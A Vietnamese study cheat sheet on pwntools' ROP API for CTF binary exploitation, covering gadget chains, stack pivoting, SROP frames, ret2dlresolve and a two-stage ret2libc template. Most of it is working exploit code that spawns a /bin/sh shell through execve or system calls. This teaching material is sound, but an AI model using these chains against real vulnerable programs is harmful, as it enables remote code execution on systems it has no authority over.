# rop — dựng ROP / SROP / ret2dlresolve

Lớp `ROP` **tự tìm gadget, tự set thanh ghi, tự bù `add rsp, N`** — thay cho việc copy địa
chỉ gadget từ ROPgadget và tự tính padding. Verify trên `bof4` (pwntools 4.15).

---

## `ROP(elf)` — khởi tạo

```python
rop = ROP(exe)                 # tìm gadget trong exe
rop = ROP([exe, libc])         # gộp gadget từ nhiều ELF
```

| Gọi | Làm gì |
|-----|--------|
| `rop.call(func, [args])` | gọi hàm, tự set args qua `pop` |
| `rop.func(args)` | **auto-method**: `rop.gets(addr)` = `call('gets',[addr])` |
| `rop(rdi=a, rsi=b, rax=c)` | **set thanh ghi** (4.15 KHÔNG có `.setregs()` — gọi object) |
| `rop.raw(x)` | nối giá trị/địa chỉ thô |
| `rop.find_gadget(['pop rdi','ret'])` | tìm gadget → `.address` |
| `rop.chain()` | ra **bytes** |
| `rop.dump()` | in đẹp để debug |
| `rop.migrate(addr)` | stack pivot (`leave; ret` tới addr) |

---

## Cơ chế: `rop` là một cái GIỎ có trạng thái

Hiểu nhầm phổ biến: tưởng `rop.chain()` "tự hiểu" từ đâu. Thực ra **`rop` là object giữ trạng
thái**. Mỗi lệnh dưới đây **KHÔNG trả về bytes** — chúng *bỏ thêm một mục vào giỏ `rop`*:

```python
rop = ROP(exe)          # giỏ rỗng
rop.call('gets', [rw])  # bỏ "gọi gets(rw)" vào giỏ      -> trả về None
rop(rax=0x3b, rdi=rw)   # bỏ "set thanh ghi" vào giỏ     -> trả về None
rop.raw(syscall_addr)   # bỏ "chèn thẳng địa chỉ" vào giỏ -> trả về None
```

Chỉ tới khi bạn **lấy đồ ra khỏi giỏ** mới sinh bytes — và lúc đó nó duyệt *toàn bộ* mục đã bỏ:

| Lấy ra | Cho ra |
|--------|--------|
| `rop.chain()` | **bytes** của cả chain (để nhét vào payload) |
| `bytes(rop)` | y hệt `rop.chain()` (nên `flat(b'A'*off, rop)` chạy được) |
| `rop.dump()` | bản in người đọc được (gadget + padding) — để debug |

Đã verify (pwntools 4.15): `chain()` gọi lại **không đổi** nếu không bỏ thêm gì; bỏ thêm 1 mục
→ `chain()` **dài ra**; `bytes(rop) == rop.chain()`; `ROP(exe)` mới luôn là **giỏ rỗng**.

```python
rop = ROP(exe); rop.raw(0xdeadbeef)
print(len(rop.chain()))      # vd 8
rop.raw(0xcafebabe)
print(len(rop.chain()))      # 16 — dài ra vì giỏ có thêm mục
```

> **Mô hình tư duy:** `call/rop()/raw/migrate` = *bỏ vào giỏ*; `chain()/bytes()/dump()` = *lấy
> ra*. Bạn không "gán vào `chain()`" — bạn đã gán vào `rop` từ trước. Thứ tự bỏ vào = **thứ tự
> thực thi** (gets trước, syscall sau).

**Không có `rop.clear()`.** Muốn "giỏ mới" thì **tạo `ROP(exe)` mới** (xem mục nhiều chain).

---

## Ví dụ 1 — gọi hàm (ret2win / ret2plt)

**Dạng bài:** có hàm `win(a, b)` hoặc gọi `system`/`puts`.

```python
rop = ROP(exe)
rop.call(exe.sym.win, [0xdead, 0xbeef])   # pop rdi; 0xdead; pop rsi; 0xbeef; win
rop.call('puts', [exe.got.puts])          # leak libc: puts(got.puts)
payload = flat(cyclic(40, n=8), rop.chain())
```

`rop.dump()`:
```
0x0000: pop rdi; ret
0x0008: 0xdead [arg0]
0x0010: pop rsi; ret   (hoặc pop rsi; pop r15; ret -> tự đệm)
...
```

**Bản làm tay:**
```python
payload  = b"A"*40
payload += p64(pop_rdi)+p64(0xdead)+p64(pop_rsi_r15)+p64(0xbeef)+p64(0)+p64(exe.sym.win)
#                                                              ^ tự nhớ đệm cho pop r15
```

---

## Ví dụ 2 — execve("/bin/sh") qua syscall (verify ra shell)

**Dạng bài:** static/không libc, có `syscall` gadget; ghi `/bin/sh` vào `.bss` rồi `execve`.

```python
rw = exe.bss(0x100)
rop = ROP(exe)
rop.call('gets', [rw])                     # đọc "/bin/sh" vào rw
rop(rax=0x3b, rdi=rw, rsi=0, rdx=0)        # set regs execve — TỰ gộp gadget & bù add rsp
rop.raw(rop.find_gadget(['syscall']).address)

p = process(exe.path)
p.sendlineafter(b"Say something: ", flat(cyclic(88), rop.chain()))
p.sendline(b"/bin/sh")                     # gets đọc chuỗi này vào rw
p.interactive()
```

pwntools tự chọn gadget `pop rax; pop rdx; add rsp, 0x28; ret` và **chèn `<pad 0x28>`** để bù
`add rsp, 0x28` — đúng cái bạn phải tự viết `b"A"*0x28`.

**Bản làm tay (dài & dễ sai padding):**
```python
payload = flat(
    cyclic(88), pop_rdi, rw, exe.sym.gets,
    pop_rdi, rw, pop_rsi, 0, pop_rdx, 0, b"A"*0x28,   # tự nhớ 0x28 cho add rsp
    pop_rax, 0x3b, syscall,
)
```

---

## `setregs` qua `rop(**regs)` & `find_gadget`

```python
rop(rdi=binsh, rsi=0, rdx=0)               # tự tìm pop rdi/rsi/rdx, xếp thứ tự, bù add rsp
g = rop.find_gadget(['syscall', 'ret'])    # hoặc ['pop rdi','ret'], ['ret']
rop.raw(g.address)
# gadget thô theo pattern:
leave_ret = rop.find_gadget(['leave', 'ret']).address
```

> 4.15: `rop.setregs(...)` **không tồn tại**, `rop.syscall` bị gadget che. Dùng `rop(**regs)`
> + `rop.raw(rop.find_gadget(['syscall']).address)`.

---

## `migrate` — stack pivot

**Dạng bài:** buffer ngắn, chỉ đủ vài gadget → pivot sang vùng lớn (bss) đã nạp chain.

```python
rop = ROP(exe)
rop.migrate(fake_stack)          # dựng: ... ; leave; ret -> rsp = fake_stack
# hoặc tay: rop.raw(leave_ret) sau khi set rbp
```

---

## SROP — `SigreturnFrame`

> **Học sâu cơ chế (signal/sigreturn, 2-frame, "read trả 15", writeup verify):**
> [`../srop.md`](../srop.md). Mục này chỉ tra nhanh API.

**Công dụng:** khi **gadget quá ít** nhưng có `syscall` + điều khiển được `rax=15` (sigreturn):
dựng **một frame** set TẤT CẢ thanh ghi cùng lúc. **Dạng bài:** cực tối giản gadget, shellcode-less.

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh      # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget          # nơi nhảy sau sigreturn
payload = flat(cyclic(off), pop_rax, 15, syscall_gadget, bytes(frame))
#                           ^ set rax=15 rồi syscall = sigreturn -> nạp frame
```

`bytes(frame)` = 248 byte (đã verify). Mọi field `frame.<reg>` gán được: `rax/rdi/rsi/rdx/rip/rsp/rbp/...`.

**Bản làm tay:** tự nhớ layout `struct sigcontext` (offset từng thanh ghi) — rất dễ sai.

---

## ret2dlresolve — `Ret2dlresolvePayload`

**Công dụng:** gọi `system("/bin/sh")` **không cần leak libc** bằng cách ép `_dl_runtime_resolve`
giải một symbol giả. **Dạng bài:** No PIE, **Partial RELRO** (GOT ghi được, có `.dynamic`),
không leak được libc, thường chỉ có `read/gets`.

```python
from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload
dl = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"], data_addr=exe.bss(0x200))

rop = ROP(exe)
rop.gets(dl.data_addr)        # (hoặc read) ghi dl.payload vào data_addr
rop.ret2dlresolve(dl)         # dựng phần ép resolve + gọi
payload = flat(cyclic(off, n=8), rop.chain())

p.sendline(payload)
p.sendline(dl.payload)        # gets đọc struct giả này vào data_addr
```

| Tham số | Ý nghĩa |
|---------|---------|
| `elf` | ELF mục tiêu (cần `.dynamic`, Partial RELRO) |
| `symbol` | tên hàm muốn resolve (`"system"`) |
| `args` | đối số (chuỗi tự đặt vào `data_addr`) |
| `data_addr` | vùng ghi được để đặt struct giả (bss) |

> Điều kiện: binary **động** có `.dynamic` (DT_STRTAB...). Binary **tĩnh** như `bof4` KHÔNG
> dùng được (sẽ lỗi `DT_STRTAB None`).

**Bản làm tay:** tự dựng `Elf64_Sym` + `Elf64_Rela` giả, tính chỉ số reloc, căn `.dynstr` — cực
lắt léo, ret2dlresolve gói toàn bộ.

---

## Nhiều chain / nhiều tầng (leak → rebase → đánh thật)

Mặc định bạn gom mọi mục vào **một `rop`** rồi gửi **một lần** — đó là *một* chain. Nhưng nhiều
bài phải gửi **nhiều chain nối tiếp**: chain 1 leak libc, chương trình **quay lại `main`/vòng
lặp**, rồi chain 2 mới dùng địa chỉ vừa leak. Nguyên tắc: **mỗi tầng = một `ROP` mới** (giỏ cũ đã
"đổ" đi, và tầng 2 thường dựng trên ELF khác — libc).

**Mẫu 2 tầng ret2libc kinh điển** (no-canary, có vòng lặp hoặc chain 1 `ret` về `main`):
```python
context.binary = exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process(exe.path)

# --- CHAIN 1: leak địa chỉ thật của puts rồi quay về main ---
rop1 = ROP(exe)
rop1.call('puts', [exe.got.puts])     # puts(got.puts) -> in địa chỉ libc ra
rop1.call(exe.sym.main)               # QUAY LẠI main để còn nhận chain 2
p.sendlineafter(b'> ', flat(cyclic(OFF), rop1.chain()))

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts   # rebase toàn bộ libc theo leak

# --- CHAIN 2: giờ mới có địa chỉ system -> ret2libc thật ---
rop2 = ROP(libc)                      # GIỎ MỚI, lần này tìm gadget trong libc
#rop2.raw(rop2.find_gadget(["ret"]).address)    # chèn 1 'ret' trước system để căn stack
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
p.sendlineafter(b'> ', flat(cyclic(OFF), rop2.chain()))
p.interactive()
```

Điểm mấu chốt:
- **`rop1.call(exe.sym.main)`** ở cuối chain 1 — không có dòng này, chain 1 chạy xong là chương
  trình thoát, bạn **mất cơ hội gửi chain 2**. Phải "nhảy về" chỗ đọc input lần nữa.
- **`rop2 = ROP(libc)`** — tầng 2 là *giỏ mới* và dựng trên `libc` (đã rebase) vì gadget/`system`
  nằm trong libc, không phải exe. Dùng `ROP([exe, libc])` nếu cần gadget cả hai.
- Mỗi `flat(cyclic(OFF), ropN.chain())` là **một lần gửi** = một chain. N tầng → N lần gửi.

**Gom nhiều việc vào CÙNG một chain (vẫn 1 lần gửi)** — khi *không* cần kết quả tầng trước:
```python
rop = ROP(exe)
rop.call('gets', [rw])          # việc 1
rop(rax=0x3b, rdi=rw, rsi=0, rdx=0)   # việc 2
rop.raw(rop.find_gadget(['syscall']).address)  # việc 3
p.sendline(flat(cyclic(OFF), rop.chain()))      # 1 lần gửi, 3 việc nối nhau
```
→ Phân biệt: **nhiều việc trong 1 chain** (nối gadget, gửi 1 phát) khác **nhiều chain** (phải
chờ output/rebase giữa chừng, gửi nhiều phát, mỗi phát 1 `ROP` mới).

**Khi chỉ có 1 lần ghi (không quay lại được):** không leak-rồi-đánh 2 tầng được → chuyển hướng
**SROP** (1 frame set hết regs) hoặc **ret2dlresolve** (khỏi cần leak) — xem dưới.

---

## Mẹo nhanh

- Luôn `print(rop.dump())` trước khi gửi — thấy ngay gadget/padding pwntools chọn.
- `ROP([exe, libc])` để trộn gadget; `ROP(libc)` cho ret2libc thuần.
- Thiếu `pop rdx`? pwntools sẽ tự tìm chuỗi `mov`/`xchg` thay thế khi set `rop(rdx=...)`.
- Gadget có `add rsp, N` → **khỏi tự đệm**, `rop()` lo. Làm tay thì nhớ chèn `b"A"*N`.
- Ít gadget → nghĩ tới **SROP**; không leak được libc + Partial RELRO → **ret2dlresolve**.
- **Nhiều việc nối nhau, gửi 1 phát** → cùng 1 `rop`. **Cần output/rebase giữa chừng** → mỗi tầng
  một `ROP` mới, cuối chain trước nhớ `rop.call(exe.sym.main)` để còn gửi tầng sau.
- `rop` không tự xoá: `chain()` đọc *cả giỏ*. Muốn làm lại từ đầu → gán `rop = ROP(exe)` mới.
